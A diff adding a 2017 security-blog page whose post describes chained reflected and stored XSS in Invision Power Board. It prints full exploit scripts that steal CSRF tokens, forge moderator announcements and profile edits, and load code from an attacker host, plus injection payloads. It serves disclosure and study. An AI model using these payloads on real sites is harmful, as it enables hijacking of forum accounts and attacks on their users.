@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>Reflected and Stored XSS in Invision Power Board</title>
+  <meta name="description" content="        Invision Power Board is a very popular paid forum software. I decided to audit it and initially found a few stored XSS vulnerabilities in the admin panel, all had a low impact, so I didn’t report them. Then I came across the Announcements function in the Moderator Control Panel. Essentially this function allows moderators and admins to create an forum announcement for every user to see, and it also allowed any HTML in it!         If I had access to a moderator account or higher, I could easily put an XSS payload in an annoucement and attack everyone. I obviously wasn’t satisfied so I kept searching for another bug to chain it with.         I eventually came across the IPS UTF8 Converter, when I was using find &amp;amp; grep to find different variables in the source code. This tool, which comes with the default installation, is used to convert all the tables in the database to UTF-8. I opened up the path to the converter admin/convertutf8/index.php and quickly got an error message. I was pretty bummed because I was initally looking into an RCE, but came up empty. But then I saw the controller= parameter. I checked the source of the page and saw that this parameter was not sanitizing any input at all and that I could insert HTML and javascript here, no authentication required! My first proof of concept was just a simple payload =&amp;gt; %29};alert(document.domain);{ %27 Most times when people report an XSS or do a write up, they just use an alert(1) and just give a hypothetical attack. I didn’t want to do that with this one. I really wanted to weaponize this as much as possible (and in a fun way), so I coded a couple scripts to do just that! The first script I coded was: http://www.sxcurity.pro/pocs/xss.js /* _ (_)_ ____ ___ __ | | &#39;_ \ \ /\ / / &#39;_ \ | | |_) \ V V /| | | | |_| .__/ \_/\_/ |_| |_| |_| IPB Exploit by @sxcurity */ // specifies the target, the title of the announcement, and the xss payload! var target = &#39;http://&amp;lt;target&amp;gt;/index.php?/modcp/announcements/&amp;amp;action=create&#39;; var title = &#39;URGENT&#39;; // Don&#39;t use quotes! It&#39;ll break our form down below! var payload = &#39;&amp;lt;script src=//&amp;lt;ATTACKER&amp;gt;/lol.js&amp;gt;&amp;lt;/script&amp;gt;&#39;; // steals the csrf token ;) var cdl = get(target); document.body.innerHTML = cdl; var form = document.getElementsByTagName(&#39;input&#39;)[3]; var token = form.value; // DON&#39;T EDIT!! // Gets the current date! Thanks stackoverflow var today = new Date(); var dd = today.getDate(); var mm = today.getMonth()+1; //January is 0! var yyyy = today.getFullYear(); if(dd&amp;lt;10){ dd=&#39;0&#39;+dd; } if(mm&amp;lt;10){ mm=&#39;0&#39;+mm; } var today = mm+&#39;/&#39;+dd+&#39;/&#39;+yyyy; // build form with valid token and evil credentials document.body.innerHTML += &#39;&amp;lt;form id=&quot;sxcurity&quot; action=&quot;&#39; + target + &#39;&quot; method=&quot;POST&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;_submitted&quot; value=&quot;1&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;csrfKey&quot; value=&quot;&#39; + token + &#39;&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;2097152&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;plupload&quot; value=&quot;sxcurity&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_title&quot; value=&quot;&#39; + title + &#39;&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_start&quot; value=&quot;&#39; + today +&#39;&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_end_unlimited&quot; value=&quot;0&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_content&quot; value=&quot;&#39;+ payload +&#39;&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_content_upload&quot; value=&quot;sxcurity&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_app_unlimited&quot; value=&quot;*&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_calendars&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_calendars-zeroVal&quot; value=&quot;on&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_download_categories&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_download_categories-zeroVal&quot; value=&quot;on&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_forums&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;announce_forums-zeroVal&quot; value=&quot;on&quot;&amp;gt;&#39; + &#39;&amp;lt;/form&amp;gt;&#39;; // submits our csrf form! document.forms[&quot;sxcurity&quot;].submit(); function get(url) { var xmlHttp = new XMLHttpRequest(); xmlHttp.open(&quot;GET&quot;, url, false); xmlHttp.send(null); return xmlHttp.responseText; } It requires a moderator or admin to visit (not too hard to do). Once they visit it, it creates an announcement abusing the first bug I found, thus chaining this reflected XSS with the stored one. It does this by stealing the moderator’s / admin’s CSRF token, builds a CSRF form with that token &amp;amp; with the HTML we want to be in the announcement, and then submits the form, creating our malicious announcement :) Payload: controller=&#39;};&amp;lt;/script&amp;gt;&amp;lt;script src=//&amp;lt;attacker&amp;gt;/xss.js&amp;gt;&amp;lt;/script&amp;gt;;{&#39; The second script I coded was: http://www.sxcurity.pro/pocs/lol.js /* www.sxcurity.pro/pocs/lol.js _ (_)_ ____ ___ __ | | &#39;_ \ \ /\ / / &#39;_ \ | | |_) \ V V /| | | | |_| .__/ \_/\_/ |_| |_| |_| IPB Exploit by @sxcurity index.php?/profile/&amp;lt;user&amp;gt;/&amp;amp;tab=field_core_pfield_1 This will add &quot;sxcurity is my hero&quot; to the user&#39;s about me. */ var target = &#39;http://localhost/ips_4141/index.php&#39;; var payload = &#39;sxcurity is my hero&#39;; // Gets the Profile URL of the victim. var cdl = get(target); document.body.innerHTML = cdl; var user_url = document.getElementsByTagName(&#39;a&#39;)[13]; var user_url1 = document.getElementsByTagName(&#39;a&#39;)[14]; var user_url2 = document.getElementsByTagName(&#39;a&#39;)[15]; var user_url3 = document.getElementsByTagName(&#39;a&#39;)[16]; var user_url4 = document.getElementsByTagName(&#39;a&#39;)[17]; var user_url5 = document.getElementsByTagName(&#39;a&#39;)[18]; var user_url6 = document.getElementsByTagName(&#39;a&#39;)[19]; var user_url7 = document.getElementsByTagName(&#39;a&#39;)[20]; var yay = user_url.href; var yay1 = user_url1.href; var yay2 = user_url2.href; var yay3 = user_url3.href; var yay4 = user_url4.href; var yay5 = user_url5.href; var yay6 = user_url6.href; var yay7 = user_url7.href; var mod_check0 = document.getElementsByTagName(&#39;a&#39;)[22]; var mod_check1 = document.getElementsByTagName(&#39;a&#39;)[22]; var mod_check2 = document.getElementsByTagName(&#39;a&#39;)[23]; var mod_check3 = document.getElementsByTagName(&#39;a&#39;)[24]; var mod_check4 = document.getElementsByTagName(&#39;a&#39;)[25]; var mod_check5 = document.getElementsByTagName(&#39;a&#39;)[26]; var mod_check6 = document.getElementsByTagName(&#39;a&#39;)[27]; var check0 = mod_check1.href; var check1 = mod_check1.href; var check2 = mod_check2.href; var check3 = mod_check3.href; var check4 = mod_check4.href; var check5 = mod_check5.href; var check6 = mod_check5.href; /* Mods / admins have a different amount of links before their profile URL, so this makes sure we grab the right profile URL and not some random one! */ if (yay.includes(&quot;profile&quot;)){ //user = normal user acc. var profile = yay; } else if (yay1.includes(&quot;profile&quot;)){ //user = normal user acc. var profile = yay1; } else if (yay2.includes(&quot;profile&quot;)){ //user = normal user acc. var profile = yay2; } else if (yay3.includes(&quot;profile&quot;)){ //user = normal user acc. var profile = yay3; } else if (yay4.includes(&quot;profile&quot;)){ //user = normal user acc. var profile = yay4; } else if (yay5.includes(&quot;profile&quot;)){ //user = normal user acc. var profile = yay5; } else if (yay6.includes(&quot;profile&quot;)){ //user = normal user acc. var profile = yay6; } else if (yay7.includes(&quot;profile&quot;)){ //user = normal user acc. var profile = yay7; } else if (check0.includes(&quot;profile&quot;)){ //user = mod or admin var profile = check0; } else if (check2.includes(&quot;profile&quot;)){ //user = mod or admin var profile = check2; } else if (check3.includes(&quot;profile&quot;)){ //user = mod or admin var profile = check3; } else if (check4.includes(&quot;profile&quot;)){ //user = mod or admin var profile = check4; } else if (check5.includes(&quot;profile&quot;)){ //user = mod or admin var profile = check5; } else if (check6.includes(&quot;profile&quot;)){ //user = mod or admin var profile = check6; } var final = profile + &#39;edit/&#39;; // steals the csrf token var csrf = get(final); document.body.innerHTML = csrf; var inp = document.getElementsByTagName(&#39;input&#39;)[3]; var token = inp.value; // build form with valid token and evil credentials document.body.innerHTML += &#39;&amp;lt;form id=&quot;woot&quot; action=&#39; + final + &#39; method=&quot;POST&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;form_submitted&quot; value=&quot;1&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;csrfKey&quot; value=&quot;&#39; + token + &#39;&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;2097152&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;plupload&quot; value=&quot;sxcurity&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;bday[month]&quot; value=&quot;0&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;bday[day]&quot; value=&quot;0&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;bday[year]&quot; value=&quot;0&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;enable_status_updates&quot; value=&quot;0&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;enable_status_updates_checkbox&quot; value=&quot;1&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;core_pfield_1&quot; value=&quot;&#39; + payload + &#39;&quot;&amp;gt;&#39; + &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;core_pfield_1_upload&quot; value=&quot;sxcurity&quot;&amp;gt;&#39; + &#39;&amp;lt;/form&amp;gt;&#39;; // submits our csrf form! document.forms[&quot;woot&quot;].submit(); function get(url) { var xmlHttp = new XMLHttpRequest(); xmlHttp.open(&quot;GET&quot;, url, false); xmlHttp.send(null); return xmlHttp.responseText; } This javascript steals the victim’s CSRF token, builds a CSRF form &amp;amp; submits it, enables the user’s status updates in order to change their “About Me” bio to “sxcurity is my hero” (shout out to Samy Kamkar for the inspiration!) Payload: controller=&#39;};&amp;lt;/script&amp;gt;&amp;lt;script src=//&amp;lt;attacker&amp;gt;/lol.js&amp;gt;&amp;lt;/script&amp;gt;;{&#39; Needless to say, I had a ton of fun weaponizing this reflected XSS and abusing the HTML option in the Announcements! It was definitely a great learning experience as well. Read the full advisory here. Thanks for reading, Corben Douglas (@sxcurity) https://hackerone.com/cdl https://twitter.com/sxcurity https://bugcrowd.com/c https://github.com/sxcurity">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://hack-r.be:4000/2017/05/09/ipb-xss/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="sxcurity.pro" href="http://hack-r.be:4000/feed.xml">
+
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="sxcurity">
+  <meta name="twitter:title" content="Reflected and Stored XSS in Invision Power Board">
+  <meta name="twitter:description" content="        Invision Power Board is a very popular paid forum software. I decided to audit it and initially found a few stored XSS vulnerabilities in the admin panel, all had a low impact, so I didn’t ...">
+  
+    <meta name="twitter:creator" content="sxcurity">
+  
+  
+
+  <script type="text/javascript">
+  WebFontConfig = {
+    google: { families: [ 'Bitter:400,700,400italic:latin' ] }
+  };
+  (function() {
+    var wf = document.createElement('script');
+    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
+      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
+    wf.type = 'text/javascript';
+    wf.async = 'true';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(wf, s);
+  })();
+</script>
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header" style="background-image: url(/images/coffee.jpg)">
+
+  <div class="wrapper">
+    <a class="site-title" style="text-decoration:none" href="/"><img height="30px" width="30px" src="/icon.svg"/>&nbsp;sxcurity.pro</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">[ About ]</a>
+      
+        
+        <a class="page-link" href="/archives/">[ Archives ]</a>
+      
+        
+        <a class="page-link" href="/advisories">[ Advisories ]</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">Reflected and Stored XSS in Invision Power Board</h1>
+    
+    <p class="post-meta"><time datetime="2017-05-09T00:00:00+00:00" itemprop="datePublished">May 9, 2017</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>        <a href="https://en.wikipedia.org/wiki/Invision_Power_Board" style="text-decoration:none;color:#DC0739">Invision Power Board</a> is a very popular paid forum software. I decided to audit it and initially found a few stored XSS vulnerabilities in the admin panel, all had a low impact, so I didn’t report them. Then I came across the <strong>Announcements</strong> function in the Moderator Control Panel. Essentially this function allows moderators and admins to create an forum announcement for every user to see, and it also allowed any HTML in it!<br />
+        If I had access to a <strong>moderator</strong> account or higher, I could easily put an XSS payload in an annoucement and attack everyone. I obviously wasn’t satisfied so I kept searching for another bug to chain it with.
+<br /><br />
+        I eventually came across the IPS UTF8 Converter, when I was using find &amp; grep to find different variables in the source code. This tool, which comes with the default installation, is used to convert all the tables in the database to UTF-8. I opened up the path to the converter <code class="highlighter-rouge">admin/convertutf8/index.php</code>  and quickly got an error message. I was pretty bummed because I was initally looking into an RCE, but came up empty. But then I saw the <code class="highlighter-rouge">controller=</code> parameter. I checked the source of the page and saw that this parameter was not sanitizing any input at all and that I could insert HTML and javascript here, no authentication required! My first proof of concept was just a simple payload =&gt;  <code class="highlighter-rouge">%29};alert(document.domain);{ %27</code>
+<br /><br />
+Most times when people report an XSS or do a write up, they just use an <code class="highlighter-rouge">alert(1)</code> and just give a hypothetical attack. I didn’t want to do that with this one. I really wanted to weaponize this as much as possible (and in a fun way), so I coded a couple scripts to do just that! 
+<br /><br />
+The first script I coded was: http://www.sxcurity.pro/pocs/xss.js</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ _
+(_)_ ____      ___ __
+| | '_ \ \ /\ / / '_ \
+| | |_) \ V  V /| | | |
+|_| .__/ \_/\_/ |_| |_|
+ |_|  IPB Exploit
+      by @sxcurity
+*/</span>
+
+<span class="c1">// specifies the target, the title of the announcement, and the xss payload!</span>
+<span class="kd">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="s1">'http://&lt;target&gt;/index.php?/modcp/announcements/&amp;action=create'</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">title</span> <span class="o">=</span> <span class="s1">'URGENT'</span><span class="p">;</span>
+
+<span class="c1">// Don't use quotes! It'll break our form down below!</span>
+<span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s1">'&lt;script src=//&lt;ATTACKER&gt;/lol.js&gt;&lt;/script&gt;'</span><span class="p">;</span>
+
+<span class="c1">// steals the csrf token ;)</span>
+<span class="kd">var</span> <span class="nx">cdl</span> <span class="o">=</span> <span class="kd">get</span><span class="p">(</span><span class="nx">target</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">cdl</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)[</span><span class="mi">3</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">form</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+
+<span class="c1">// DON'T EDIT!!</span>
+<span class="c1">// Gets the current date! Thanks stackoverflow</span>
+<span class="kd">var</span> <span class="nx">today</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">dd</span> <span class="o">=</span> <span class="nx">today</span><span class="p">.</span><span class="nx">getDate</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">mm</span> <span class="o">=</span> <span class="nx">today</span><span class="p">.</span><span class="nx">getMonth</span><span class="p">()</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> <span class="c1">//January is 0!</span>
+<span class="kd">var</span> <span class="nx">yyyy</span> <span class="o">=</span> <span class="nx">today</span><span class="p">.</span><span class="nx">getFullYear</span><span class="p">();</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">dd</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">){</span>
+    <span class="nx">dd</span><span class="o">=</span><span class="s1">'0'</span><span class="o">+</span><span class="nx">dd</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">mm</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">){</span>
+    <span class="nx">mm</span><span class="o">=</span><span class="s1">'0'</span><span class="o">+</span><span class="nx">mm</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">today</span> <span class="o">=</span> <span class="nx">mm</span><span class="o">+</span><span class="s1">'/'</span><span class="o">+</span><span class="nx">dd</span><span class="o">+</span><span class="s1">'/'</span><span class="o">+</span><span class="nx">yyyy</span><span class="p">;</span>
+
+<span class="c1">// build form with valid token and evil credentials</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span>
+  <span class="o">+=</span> <span class="s1">'&lt;form id="sxcurity" action="'</span> <span class="o">+</span> <span class="nx">target</span> <span class="o">+</span> <span class="s1">'" method="POST"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="_submitted" value="1"&gt;'</span>
+  <span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="csrfKey" value="'</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="s1">'"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="MAX_FILE_SIZE" value="2097152"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="plupload" value="sxcurity"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_title" value="'</span> <span class="o">+</span> <span class="nx">title</span> <span class="o">+</span> <span class="s1">'"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_start" value="'</span> <span class="o">+</span> <span class="nx">today</span> <span class="o">+</span><span class="s1">'"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_end_unlimited" value="0"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_content" value="'</span><span class="o">+</span> <span class="nx">payload</span> <span class="o">+</span><span class="s1">'"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_content_upload" value="sxcurity"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_app_unlimited" value="*"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_calendars"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_calendars-zeroVal" value="on"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_download_categories"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_download_categories-zeroVal" value="on"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_forums"&gt;'</span>
+	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_forums-zeroVal" value="on"&gt;'</span>
+  <span class="o">+</span> <span class="s1">'&lt;/form&gt;'</span><span class="p">;</span>
+
+<span class="c1">// submits our csrf form!</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="s2">"sxcurity"</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+
+<span class="kd">function</span> <span class="kd">get</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">xmlHttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>It requires a moderator or admin to visit (not too hard to do). Once they visit it, it creates an announcement abusing the first bug I found, thus chaining this reflected XSS with the stored one. It does this by stealing the moderator’s / admin’s CSRF token, builds a CSRF form with that token &amp; with the HTML we want to be in the announcement, and then submits the form, creating our malicious announcement :) <br /><br />
+Payload: <code class="highlighter-rouge">controller='};&lt;/script&gt;&lt;script src=//&lt;attacker&gt;/xss.js&gt;&lt;/script&gt;;{' </code></p>
+
+<p>The second script I coded was: http://www.sxcurity.pro/pocs/lol.js</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+www.sxcurity.pro/pocs/lol.js
+ _
+(_)_ ____      ___ __
+| | '_ \ \ /\ / / '_ \
+| | |_) \ V  V /| | | |
+|_| .__/ \_/\_/ |_| |_|
+ |_|  IPB Exploit
+      by @sxcurity
+
+index.php?/profile/&lt;user&gt;/&amp;tab=field_core_pfield_1
+This will add "sxcurity is my hero" to the user's about me.
+*/</span>
+<span class="kd">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="s1">'http://localhost/ips_4141/index.php'</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s1">'sxcurity is my hero'</span><span class="p">;</span>
+
+<span class="c1">// Gets the Profile URL of the victim.</span>
+<span class="kd">var</span> <span class="nx">cdl</span> <span class="o">=</span> <span class="kd">get</span><span class="p">(</span><span class="nx">target</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">cdl</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">user_url</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">13</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">user_url1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">14</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">user_url2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">15</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">user_url3</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">16</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">user_url4</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">17</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">user_url5</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">18</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">user_url6</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">19</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">user_url7</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">20</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">yay</span> <span class="o">=</span> <span class="nx">user_url</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">yay1</span> <span class="o">=</span> <span class="nx">user_url1</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">yay2</span> <span class="o">=</span> <span class="nx">user_url2</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">yay3</span> <span class="o">=</span> <span class="nx">user_url3</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">yay4</span> <span class="o">=</span> <span class="nx">user_url4</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">yay5</span> <span class="o">=</span> <span class="nx">user_url5</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">yay6</span> <span class="o">=</span> <span class="nx">user_url6</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">yay7</span> <span class="o">=</span> <span class="nx">user_url7</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">mod_check0</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">22</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">mod_check1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">22</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">mod_check2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">23</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">mod_check3</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">24</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">mod_check4</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">25</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">mod_check5</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">26</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">mod_check6</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">27</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">check0</span> <span class="o">=</span> <span class="nx">mod_check1</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">check1</span> <span class="o">=</span> <span class="nx">mod_check1</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">check2</span> <span class="o">=</span> <span class="nx">mod_check2</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">check3</span> <span class="o">=</span> <span class="nx">mod_check3</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">check4</span> <span class="o">=</span> <span class="nx">mod_check4</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">check5</span> <span class="o">=</span> <span class="nx">mod_check5</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">check6</span> <span class="o">=</span> <span class="nx">mod_check5</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+
+
+<span class="cm">/*
+Mods / admins have a different amount of links before their profile URL, so this makes sure
+we grab the right profile URL and not some random one!
+*/</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">yay</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = normal user acc.</span>
